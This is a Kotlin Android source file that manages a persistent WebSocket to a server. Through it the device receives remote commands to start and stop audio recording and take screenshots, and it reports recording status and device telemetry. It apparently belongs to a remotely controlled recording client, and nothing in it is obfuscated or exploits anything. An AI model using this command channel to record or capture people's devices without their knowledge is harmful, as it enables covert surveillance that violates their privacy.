package com.audiostream.client

import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import java.net.URLEncoder
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * DeviceSocketManager.kt — 2-Way Persistent WebSocket Connection Manager (WhatsApp/FB Style).
 *
 * Keeps a continuous, low-power TCP WebSocket connection open to the server:
 *   - Receives server commands (START, STOP, SCREENSHOT_NOW) instantly with 0ms delay
 *   - Sends automated command acknowledgments
 *   - Streams real-time telemetry (battery, free storage, audio routing)
 *   - Auto-reconnects with exponential backoff on network drop or reconnect
 */
class DeviceSocketManager(
    private val serverUrl: String,
    private val clientId: String,
    private val onCommandReceived: (command: String, startTime: String, stopTime: String) -> Unit,
    private val onLog: (String) -> Unit,
    private val onConnectionStateChanged: (connected: Boolean) -> Unit
) {
    private val isRunning = AtomicBoolean(false)
    private val isConnected = AtomicBoolean(false)
    private var webSocket: WebSocket? = null

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var reconnectJob: Job? = null
    private var reconnectDelayMs = 2000L

    private val httpClient = OkHttpClient.Builder()
        .pingInterval(15, TimeUnit.SECONDS) // Keeps connection alive through NAT/firewalls
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.MILLISECONDS) // Infinite read timeout for WebSockets
        .build()

    fun start() {
        if (isRunning.getAndSet(true)) return
        onLog("⚡ Starting real-time WebSocket manager...")
        connect()
    }

    fun stop() {
        if (!isRunning.getAndSet(false)) return
        reconnectJob?.cancel()
        try {
            webSocket?.close(1000, "Service stopped")
        } catch (_: Exception) {}
        webSocket = null
        isConnected.set(false)
        scope.cancel()
        onLog("WebSocket manager stopped")
    }

    private fun getWebSocketUrl(): String {
        val cleanUrl = serverUrl.trimEnd('/')
        val wsBase = if (cleanUrl.startsWith("https://", ignoreCase = true)) {
            "wss://" + cleanUrl.substring(8)
        } else if (cleanUrl.startsWith("http://", ignoreCase = true)) {
            "ws://" + cleanUrl.substring(7)
        } else if (cleanUrl.startsWith("wss://", ignoreCase = true) || cleanUrl.startsWith("ws://", ignoreCase = true)) {
            cleanUrl
        } else {
            "ws://$cleanUrl"
        }

        val encodedId = try {
            URLEncoder.encode(clientId, "UTF-8")
        } catch (_: Exception) {
            clientId
        }

        return "$wsBase/ws/device?client_id=$encodedId"
    }

    private fun connect() {
        if (!isRunning.get()) return

        val wsUrl = getWebSocketUrl()
        onLog("Connecting WebSocket: $wsUrl")

        val request = try {
            Request.Builder().url(wsUrl).build()
        } catch (e: Exception) {
            onLog("Invalid WebSocket URL ($wsUrl): ${e.message}")
            scheduleReconnect()
            return
        }

        webSocket = httpClient.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(ws: WebSocket, response: Response) {
                isConnected.set(true)
                reconnectDelayMs = 2000L // Reset backoff
                onConnectionStateChanged(true)
                onLog("✓ WebSocket connected to server (Live 2-way link active)")

                // Send registration payload
                val registerPayload = JSONObject().apply {
                    put("type", "register")
                    put("client_id", clientId)
                }.toString()
                ws.send(registerPayload)
            }

            override fun onMessage(ws: WebSocket, text: String) {
                handleIncomingMessage(ws, text)
            }

            override fun onClosing(ws: WebSocket, code: Int, reason: String) {
                onLog("WebSocket closing: $code / $reason")
            }

            override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                isConnected.set(false)
                onConnectionStateChanged(false)
                onLog("WebSocket closed: $reason")
                scheduleReconnect()
            }

            override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                isConnected.set(false)
                onConnectionStateChanged(false)
                onLog("WebSocket failure: ${t.message}")
                scheduleReconnect()
            }
        })
    }

    private fun handleIncomingMessage(ws: WebSocket, text: String) {
        try {
            val json = JSONObject(text)
            val type = json.optString("type", "")

            when (type) {
                "command" -> {
                    val command = json.optString("command", "NONE")
                    val startTime = json.optString("start_time", "")
                    val stopTime = json.optString("stop_time", "")

                    onLog("⚡ Instant command received via WebSocket: $command")

                    // Dispatch to service
                    onCommandReceived(command, startTime, stopTime)

                    // Acknowledge back over the open socket
                    val ackPayload = JSONObject().apply {
                        put("type", "command_ack")
                        put("client_id", clientId)
                        put("command", command)
                    }.toString()
                    ws.send(ackPayload)
                }

                "connected" -> {
                    onLog("Server confirmed WebSocket registration")
                }

                "pong" -> {
                    // Server responded to heartbeat
                }

                else -> {
                    // Check if a direct command was sent without a "type" wrapper
                    val command = json.optString("command", "")
                    if (command.isNotEmpty()) {
                        onLog("⚡ Direct command received: $command")
                        onCommandReceived(command, json.optString("start_time", ""), json.optString("stop_time", ""))
                    }
                }
            }
        } catch (e: Exception) {
            onLog("Error handling WebSocket message: ${e.message}")
        }
    }

    private fun scheduleReconnect() {
        if (!isRunning.get()) return

        reconnectJob?.cancel()
        reconnectJob = scope.launch {
            onLog("Reconnecting WebSocket in ${reconnectDelayMs / 1000}s...")
            delay(reconnectDelayMs)
            // Exponential backoff capped at 30 seconds
            reconnectDelayMs = minOf(reconnectDelayMs * 2, 30_000L)
            connect()
        }
    }

    /**
     * Send real-time telemetry over the live socket.
     */
    fun sendTelemetry(batteryPct: Int, storageMb: Long, route: String) {
        if (!isConnected.get()) return
        scope.launch {
            try {
                val payload = JSONObject().apply {
                    put("type", "telemetry")
                    put("client_id", clientId)
                    put("battery", batteryPct)
                    put("storage_mb", storageMb)
                    put("audio_route", route)
                }.toString()
                webSocket?.send(payload)
            } catch (_: Exception) {}
        }
    }

    /**
     * Send recording status update over socket.
     */
    fun sendStatus(status: String) {
        if (!isConnected.get()) return
        scope.launch {
            try {
                val payload = JSONObject().apply {
                    put("type", "status_update")
                    put("client_id", clientId)
                    put("status", status)
                }.toString()
                webSocket?.send(payload)
            } catch (_: Exception) {}
        }
    }

    fun isConnected(): Boolean = isConnected.get()
}
